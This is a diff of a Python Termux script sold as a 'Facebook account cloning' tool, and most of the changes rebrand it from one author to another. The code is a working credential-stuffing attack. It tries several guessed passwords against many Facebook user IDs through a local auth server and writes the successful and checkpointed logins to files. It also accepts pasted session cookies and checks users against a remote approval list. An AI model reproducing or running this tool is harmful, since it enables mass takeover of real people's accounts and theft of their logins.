@@ -6,8 +6,8 @@
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mark_Cornel'
-__copyright = 'All rights reserved . Copyright  Mark'
+__author__ = 'Timmy_Tedy'
+__copyright = 'All rights reserved . Copyright  Timmy'
 os.system('termux-setup-storage')
 try:
     os.mkdir('/sdcard/ids')
@@ -23,7 +23,7 @@ header = {'x-fb-connection-bandwidth': repr(bd),
    'x-fb-net-hni': repr(sim), 
    'x-fb-connection-quality': 'EXCELLENT', 
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-   'user-agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
+   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
    'content-type': 'application/x-www-form-urlencoded', 
    'x-fb-http-engine': 'Liger'}
 os.system('git pull')
@@ -40,13 +40,12 @@ logo = """
 \033[1;96m   | |_| ||  __/| (_| || (_| | | | | || (_| || (__ |   <
 \033[1;96m   |____/  \___| \__,_| \__,_| |_| |_| \__,_| \___||_|\_\
 
- \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
-
- \033[32;1mCreator \033[37;1m: \033[33;1mMARK CORNEL
-
- \033[32;1mVersion \033[37;1m: \033[33;1m1.2
-
-"""
+\033[1;91m                ================================\033[1;93mAUTHER : TIMMY TEDY
+GITHUB : \033[1;93mTimTed 
+WHATSAPP: +2347034457117\033[1;93m
+FB : https://www.facebook.com/Timmy.Tedy12\033[1;93m
+=================================\033[1;93m          Send id in Messenger or WhatsApp for approval\n\x1b[1;97m `
+=================================\033[1;93m
 
 def reg():
     os.system('clear')
@@ -60,7 +59,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/GUPTA-SHAKEL/cloner1/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/TimTed/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -76,12 +75,12 @@ def reg():
         print ''
         print ' \x1b[1;92mYour Id Is Not Approved Already '
         print ''
-        print ' \x1b[1;92mCopy token id and send to Mark Cornel'
+        print ' \x1b[1;92mCopy token id and send to Timmy Tedy'
         print ''
         print ' \x1b[1;92mYour id: ' + to
         print ''
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
+        os.system('xdg-open https://wa.me/7034457117')
         reg()
 
 
@@ -91,14 +90,14 @@ def reg2():
     print ''
     print '\tApproval not detected'
     print ''
-    print ' \x1b[1;92mCopy And Press Enter , And Send Me On Facebook'
+    print ' \x1b[1;92mCopy And Press Enter , And Send Me On WhatsApp'
     print ''
     id = uuid.uuid4().hex[:50]
     print ' Your id: ' + id
     print ''
     print ''
-    raw_input(' Press enter to go to Facebook ')
-    os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
+    raw_input(' Press enter to go to WhatsApp ')
+    os.system('xdg-open https://wa.me/7034457117')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -157,7 +156,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \033[1;93mhttps://github.com/GUPTA-SHAKEL')
+    s = raw_input(' \033[1;93mhttps://github.com/TimTed ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -227,7 +226,7 @@ def log_cookie():
     print ''
     try:
         cookie = raw_input(' Paste cookies here: ')
-        data = {'user-agent': 'Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16', 
+        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
            'referer': 'https://m.facebook.com/', 
            'host': 'm.facebook.com', 
            'origin': 'https://m.facebook.com', 
@@ -515,7 +514,7 @@ def a_s():
     time.sleep(0.5)
     print ''
     print 47 * '-'
-    print '\t\x1b[1;38mKiNg Of Facebook Mark Cornel\x1b[0;97m'
+    print '\t\x1b[1;38mKiNg Of Facebook TIMMY\x1b[0;97m'
     print 47 * '-'
     print ''
 
@@ -527,13 +526,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass1
+                print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass1
+                print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -543,7 +542,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass2
+                    print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -559,13 +558,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass3
+                        print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass3
+                        print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -574,13 +573,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass4
+                            print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass4
+                            print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass4
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -589,13 +588,13 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass5
+                                print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass5
                                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass5
+                                print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass5
                                 cp = open('HOP_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -604,13 +603,13 @@ def a_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass6
                                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass6
+                                    print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass6
                                     cp = open('HOP_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
@@ -619,13 +618,13 @@ def a_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass7
                                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass7
+                                        print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass7
                                         cp = open('HOP_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
@@ -634,13 +633,13 @@ def a_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[MARK-OK] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;92m[TIM-OK] ' + uid + ' | ' + pass8
                                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;93m[MARK-CP] ' + uid + ' | ' + pass8
+                                            print '\x1b[1;93m[TIM-CP] ' + uid + ' | ' + pass8
                                             cp = open('HOP_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
